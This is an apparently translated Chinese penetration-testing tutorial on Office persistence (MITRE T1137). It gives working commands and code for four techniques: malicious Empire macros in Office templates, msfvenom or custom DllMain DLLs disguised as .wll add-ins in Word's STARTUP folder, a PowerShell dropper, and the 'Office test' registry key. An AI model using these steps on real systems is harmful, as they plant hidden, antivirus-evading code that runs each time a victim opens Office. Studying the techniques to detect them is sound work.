**作者：pentestlab  
原文链接：<https://mp.weixin.qq.com/s/SZPmGDfDIpK3fP5nlHUcMA>**

Microsoft Office 是 Windows 操作系统中使用最多的产品，用来完成每日的工作，比如 HR
筛选简历、销售人员编写标书、汇报工作编写演示文稿等。如何利用 Office 软件的功能实现权限持久化呢？

### Office 模板

对于企业而言，都喜欢使用统一的模板文件，在每次启动 Office 软件时加载模板，模板文件存储在下面的位置：

> C:\Users\pentestlab\AppData\Roaming\Microsoft\Templates

![图片](https://images.seebug.org/content/images/2021/05/27/1622105846000-640.png-w331s)

如果恶意宏嵌入到基础模板中，用户在每次启动 Office 软件时，都执行一下恶意的宏代码，可以使用 PowerShell Empire 中的模块生成宏代码：

> usestager windows/macro set Listener http execute

![图片](https://images.seebug.org/content/images/2021/05/27/1622105846000-640.png-w331s)

生成的宏可以直接插入到模板文档中，对代码进行混淆可以绕过一些防病毒的检测：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105846000-640.png-w331s)

当用户打开模板文件时，执行 Office 宏代码，可以看到目标连接的 Session：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105846000-640-1622105778776.png-w331s)

### 外部插件

Office 外部插件用于扩展 Office 程序的功能。当 Office
应用程序启动时，会对存储外部插件的文件夹进行检查，以便应用程序加载它们。执行以下命令来发现 Microsoft Word 的可信位置，也可以删除外部插件。

> Get-ChildItem "hkcu:\Software\Microsoft\Office\16.0\Word\Security\Trusted
> Locations"

![图片](https://images.seebug.org/content/images/2021/05/27/1622105847000-640-1622105778818.png-w331s)

Office 的外部插件是 DLL 文件，扩展名不同，表示使用不同的应用程序，例如 **.wll** 代表 Word， **.xll** 代表
Excel。Metasploit Framework 的“msfvenom”可用于创建可被使用的 DLL 文件，然后将扩展名修改为“ **.wll**
”（Word 插件程序的扩展名），并将文件移动到 Word 启动文件夹，每次 Word 启动时执行外部插件：

> C:\Users\Admin\AppData\Roaming\Microsoft\Word\STARTUP

![图片](https://images.seebug.org/content/images/2021/05/27/1622105847000-640-1622105778883.png-w331s)

代码执行后，meterpreter 会得到一个回连 Session，但是 word 会崩溃，这对于用户来说能够知道，Word
可能被人破坏或者修改，容易引起用户的警觉：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105847000-640-1622105778892.png-w331s)

最好的方法是创建一个不会导致应用程序崩溃的自定义 DLL 文件

**DLL_PROCESS_ATTACH** 可以把 DLL 加载到当前进程的虚拟地址空间（Word、Excel、PowerPoint 等），DLL
一旦被加载，就可以启动任意可执行的文件：

    
    
    // dllmain.cpp : Defines the entry point for the DLL application.
    #include "pch.h"
    #include <stdlib.h>
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            system("start pentestlab32.exe");
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

![图片](https://images.seebug.org/content/images/2021/05/27/1622105847000-640-1622105778918.png-w331s)

Word Add-Ins 具有“ **.wll** ”文件的扩展名，本质上是放置在 Word 启动文件夹中的 DLL 文件，每次 Microsoft
Word 启动时都会加载：

> C:\Users\Admin\AppData\Roaming\Microsoft\Word\STARTUP

![图片](https://images.seebug.org/content/images/2021/05/27/1622105847000-640-1622105778950.png-w331s)

下次 Word 启动时，将加载加载 DLL 程序，并执行恶意文件：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640.webp-w331s)

还有个 Powershell 版本的脚本，可以生成相关文件（WLL、XLL、VBA）。并将这些文件复制到 Word、Excel 或 PowerPoint
的启动文件夹中：

下载地址：

> <https://github.com/3gstudent/Office-Persistence>

使用方法：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640-1622105778973.png-w331s)

默认情况下，脚本生成的程序主要是用来弹出计算器，用户验证持久化的能力：

## -
    
    
    $fileContentBytes = [System.Convert]::FromBase64String($fileContent) [System.IO.File]::WriteAllBytes($env:APPDATA+"\Microsoft\Word\Startup\calc.wll",$fileContentBytes)

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640.webp-w331s)

### Office test

在注册表中创建一个注册表项，在 Office 软件启动时，会自动加载该注册表项中指定的 DLL 文件，创建命令如下：

> reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t
> REG_SZ /d C:\tmp\pentestlab.dll

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640-1622105778999.png-w331s)

该命令将创建以下注册表结构：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640-1622105779000.png-w331s)

当 Microsoft Office 应用程序再次启动时，DLL 被执行：

![图片](https://images.seebug.org/content/images/2021/05/27/1622105848000-640-1622105779026.png-w331s)

### 参考文献

<https://attack.mitre.org/techniques/T1137/>

<https://docs.microsoft.com/zh-cn/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa>

<https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/>

<https://github.com/3gstudent/Office-Persistence>

<https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/>

<https://github.com/Pepitoh/VBad>

<https://github.com/outflanknl/EvilClippy>

<https://github.com/christophetd/spoofing-office-macro>

<https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/>

<https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/>

<http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/>

<https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique>

<https://labs.f-secure.com/archive/add-in-opportunities-for-office-persistence/>

<https://github.com/enigma0x3/Generate-Macro>

<https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/>

<https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/>

<https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1591/>

